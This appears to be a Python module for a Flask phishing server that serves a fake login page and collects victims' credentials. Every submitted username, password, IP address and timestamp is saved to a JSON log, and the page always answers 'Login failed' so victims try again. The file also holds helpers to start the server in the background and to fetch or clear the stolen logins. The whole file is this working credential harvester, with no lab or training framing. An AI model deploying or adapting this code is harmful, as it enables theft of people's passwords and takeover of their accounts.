import os
import json
import time
import threading
from flask import Flask, request, render_template

#Empty phish logs
phish_logins = []

#Start phish server
def start_server():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    phishing_path = os.path.join(base_dir, "..", "phishing_site")

    app = Flask(
        __name__,
        template_folder=os.path.join(phishing_path, "templates"),
        static_folder=os.path.join(phishing_path, "static")
    )

    @app.route("/", methods=["GET", "POST"])
    def login():
        if request.method == "POST":
            phish_logins.append({
                "username": request.form["username"],
                "password": request.form["password"],
                "ip": request.remote_addr,
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
            })
            save_log(phish_logins)
            return "Login failed. Try again."
        return render_template("login.html")

    app.run(host="0.0.0.0", port=5001, debug=False)

#Sve logs in JSON
def save_log(entries, filename="phish_log.json"):
    if os.path.exists(filename):
        with open(filename, "r") as f:
            data = json.load(f)
    else:
        data = []

    data.append(entries)

    with open(filename, "w") as f:
        json.dump(data, f, indent=4)

#Get logs
def get_logins():
    return phish_logins

#Clear logs
def clear_logins():
    phish_logins.clear()

#Decision
def phish_dec(action, **kwargs):
    if action == "start":
        threading.Thread(target=start_server, daemon=True).start()
        return True
    elif action == "get_log":
        return get_logins()
    elif action == "clear":
        return clear_logins()
    return None
